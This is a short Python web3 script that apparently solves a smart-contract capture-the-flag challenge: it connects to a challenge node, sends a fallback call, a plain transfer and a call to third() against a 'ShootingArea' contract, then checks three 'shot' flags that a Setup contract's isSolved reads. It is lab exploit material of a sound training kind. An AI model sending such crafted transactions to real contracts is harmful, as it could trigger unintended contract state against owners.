from web3 import Web3

abi = '''[
	{
		"stateMutability": "payable",
		"type": "fallback"
	},
	{
		"inputs": [],
		"name": "firstShot",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "secondShot",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "third",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "thirdShot",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	}
]'''

abi2 = '''[
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "TARGET",
		"outputs": [
			{
				"internalType": "contract ShootingArea",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]'''

w3 = Web3(Web3.HTTPProvider('http://159.65.62.241:31005'))
contract = w3.eth.contract(address='0xDdA00938E6a998781681E182599e6f6dCFA89808', abi=abi)
setup = w3.eth.contract(address='0x5341F586E1e3858203b8e65060eFFeCdc64E049F', abi=abi2)
# Step 1:
# w3.eth.send_transaction({'to': '0xDdA00938E6a998781681E182599e6f6dCFA89808', 'from': '0xC98533e5811dA2dcE3b233d4E00E150DdE9773d4', 'data': "0x61455567"})

# Step 2:
# w3.eth.send_transaction({'to': '0xDdA00938E6a998781681E182599e6f6dCFA89808', 'from': '0xC98533e5811dA2dcE3b233d4E00E150DdE9773d4'})

# Step 3:
contract.functions.third().transact()
print('1', contract.functions.firstShot().call())
print('2', contract.functions.secondShot().call())
print('3', contract.functions.thirdShot().call())
print(dir(contract.functions))
